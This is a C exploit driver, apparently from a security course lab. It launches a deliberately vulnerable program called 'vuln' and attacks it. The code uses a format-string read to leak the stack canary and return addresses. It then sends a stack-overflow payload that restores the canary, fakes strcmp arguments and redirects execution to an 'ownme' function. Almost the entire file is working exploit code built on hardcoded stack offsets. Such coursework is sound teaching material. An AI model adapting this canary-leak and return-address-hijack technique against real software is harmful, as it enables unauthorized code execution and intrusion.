#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

// Beautified print_escaped: print first two character then, gather by 4 bytes
void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   int l=-3;
   fprintf(stderr, "\n%4d:", 0); // empty line
   for (i=0; i < len; i++) {
      if(i%4==2 && i%16==2)
         fprintf(stderr, "\n%4d:", l+=4);
      else if(i%4==2)
         fprintf(stderr, " ");
      fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Values obtained from the run #1
   void *auth_user       = (void*) 0xbfffe6f0; // value of user variable in auth
   void *auth_canary_loc = (void*) 0xbfffe88c; // location where auth's canary is stored
   void *auth_ra_loc     = (void*) 0xbfffe89c; // location of auth's return address

   // Values obtained from the run #2
   void *auth_user2      = (void*) 0xbfffe700; // value of user variable in auth from run #2
   void *auth_user2_loc  = (void*) 0xbfffe894; // user variable location from run #2
   void *auth_pass2_loc  = (void*) 0xbfffe888; // pass variable location from run #2
   void *auth_l2_loc     = (void*) 0xbfffe898; // l variable location from run #2

   unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
   unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;

   unsigned int offset_auth_user2_loc = auth_user2_loc - auth_user2;
   unsigned int offset_auth_pass2_loc = auth_pass2_loc - auth_user2;
   unsigned int offset_auth_l2_loc = auth_l2_loc - auth_user2;

   // Detailed steps
   // 1. Extract runtime information
   put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
   send();

   void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
   get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
      (unsigned int) canary, 
      (unsigned int) main_loop_bp, 
      (unsigned int) main_loop_ra);

   // 2. Find address of ownme()
   int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
   void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
   fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);

   // 3. Exploit
   // 3-1. Prepare the payload
   unsigned explsz = 4 + auth_user_auth_ra_loc_diff;

   void* *expl = (void**)malloc(explsz);
   memset((void*)expl, '\0', explsz);

   fprintf(stderr, "driver: exploit size: %d\n", explsz);

   // 3-2. Inject canary and RA
   expl[auth_user_auth_canary_loc_diff/sizeof(void*)] = canary;
   expl[auth_user_auth_ra_loc_diff/sizeof(void*)] = ownme_addr;
   fprintf(stderr, "driver: Inject canary/RA    : Setting values at offset: 0x%x 0x%x\n", 
      auth_user_auth_canary_loc_diff/sizeof(void*), 
      auth_user_auth_ra_loc_diff/sizeof(void*));

   // 3-3. Inject strcmp params
   //      Note. otherwise segfault before returning from auth)
   //      For fake reference to accessible address for strcmp(user, pass, len), use
   //      &user[0] as the accessible mem loc on stack, which is user[0]
   expl[offset_auth_l2_loc/sizeof(void*)] = 0; // no length comparison in strcmp
   expl[offset_auth_user2_loc/sizeof(void*)] = main_loop_bp;
   expl[offset_auth_pass2_loc/sizeof(void*)] = main_loop_bp;
   fprintf(stderr, "driver: Inject strcmp params: Setting values at offset: 0x%x\n", 
      offset_auth_l2_loc/sizeof(void*));

   // 4. Send the payload
   // 4-1. To pass "if(user != null && pass != null)
   put_str("p xyz\n");
   send();
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();

   // 4-2. In order to call auth
   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
